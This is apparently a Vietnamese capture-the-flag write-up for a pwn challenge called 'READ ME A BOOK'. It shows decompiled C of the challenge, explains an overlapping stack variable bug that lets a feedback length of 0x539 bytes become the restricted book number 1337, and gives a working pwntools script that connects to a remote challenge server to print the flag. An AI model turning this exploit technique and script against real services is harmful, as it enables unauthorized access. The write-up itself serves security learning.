# READ ME A BOOK

## Source

<details> <summary> source </summary>

```c
void __fastcall catflag(int a1)
{
  FILE *stream; // [rsp+18h] [rbp-18h]
  __int64 size; // [rsp+20h] [rbp-10h]
  void *ptr; // [rsp+28h] [rbp-8h]

  if ( a1 == 1337 )
  {
    stream = fopen("books/flag.txt", "rb");
  }
  else
  {
    if ( a1 > 1337 )
      goto LABEL_16;
    if ( a1 == 4 )
    {
      stream = fopen("books/not_a_flag.txt", "rb");
    }
    else
    {
      if ( a1 > 4 )
        goto LABEL_16;
      switch ( a1 )
      {
        case 3:
          stream = fopen("books/youtiaos_recipe.txt", "rb");
          break;
        case 1:
          stream = fopen("books/bee_movie.txt", "rb");
          break;
        case 2:
          stream = fopen("books/star_wars_opening.txt", "rb");
          break;
        default:
          goto LABEL_16;
      }
    }
  }
  if ( !stream )
  {
LABEL_16:
    puts("We don't have that book!");
    return;
  }
  fseek(stream, 0LL, 2);
  size = ftell(stream);
  ptr = calloc(1uLL, size + 1);
  fseek(stream, 0LL, 0);
  fread(ptr, size, 1uLL, stream);
  puts(" ---------------------------------");
  puts("The story goes...");
  puts((const char *)ptr);
  puts(" ---------------------------------");
  fclose(stream);
  free(ptr);
}

__int64 option1()
{
  int v1[11]; // [rsp+Ch] [rbp-34h] BYREF
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("\nWhich book would you like to read?");
  puts("1. Bee Movie Script");
  puts("2. Star Wars Opening");
  puts("3. Recipe to make the best Youtiaos");
  puts("4. The Secret to Life");
  printf("> ");
  if ( (unsigned int)__isoc99_scanf("%d", v1) && v1[0] == 1337 )
  {
    puts("\nLibrarian: Hey! This book is not for your eyes!");
    handler((int)"\nLibrarian: Hey! This book is not for your eyes!");
  }
  delete();
  return (unsigned int)v1[0];
}

unsigned __int64 option2()
{
  void *buf; // [rsp+0h] [rbp-40h]
  unsigned __int64 v2; // [rsp+38h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  buf = malloc(0x1000uLL);
  printf("Leave us your feedback: ");
  read(0, buf, 0xFFFuLL);
  puts("Thanks! Our librarians will have a look at your feedback.");
  dword_402C = 1;
  free(buf);
  return v2 - __readfsqword(0x28u);
}

void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)
{
  int v3; // [rsp+0h] [rbp-10h] BYREF
  int v4; // [rsp+4h] [rbp-Ch]
  unsigned __int64 v5; // [rsp+8h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  sub_159D(a1, a2, a3);
  while ( 1 )
  {
    while ( 1 )
    {
      menu();
      __isoc99_scanf("%d", &v3);
      delete();
      if ( v3 != 1 )
        break;
      v4 = option1();
      catflag(v4);
    }
    if ( v3 != 2 )
    {
      puts("Goodbye!");
      exit(0);
    }
    if ( dword_402C )
      puts("You have already given your feedback.");
    else
      option2();
  }
}
```

</details>

## Ý tưởng

- Bài này lỗi chồng chéo stack
- Lỗi ở đây khi debug dừng chỗ `read(0, buf, 0xFFFuLL);` của option2 thì ta thấy giá trị trả về của read() là số byte read() đọc được vào rax() (giả sử trường hợp này mình nhập vào 0x538 byte "a" + 1 endline)
  ![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/4018952d-f7b2-400c-9382-a3025879e467)
- và câu lệnh asm tiếp theo là ` mov    DWORD PTR [rbp-0x34], eax` đưa số byte này vào `$rbp-0x34` mà ở option1 ta có `  int v1[11]; // [rsp+Ch] [rbp-34h] BYREF` cũng ở `rbp-0x34` đó là lỗi chồng chéo stack.

- Khi trở về hàm scanf trong option 1 ta thấy rsi của `v1[0]` đã là 1337, bây giờ chúng ta chỉ cần nhập chữ thì hàm scanf() sẽ không đọc được và không thay đổi 1337.

## Khai thác

- Đầu tiên ta chọn option 2 và gửi vào 0x539 byte, sau đó chọn option 1 và gửi vào chữ.

```python
#!/usr/bin/python3

from pwn import *

exe = ELF('chall', checksec=False)

context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''


                c
                ''')
                input()

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('34.124.157.94', 12344)
else:
        p = process(exe.path)

GDB()
sla(b"Option: ", b"2")
sa(b": ", b"a" * 0x539)
sla(b"Option: ", b"1")
sla(b"> ", b"a")

p.interactive()


```

## Kết quả

![image](https://github.com/wan-hyhty/CTFs_competition/assets/111769169/515af9c1-8542-45db-a6c5-a17ce5430d5a)
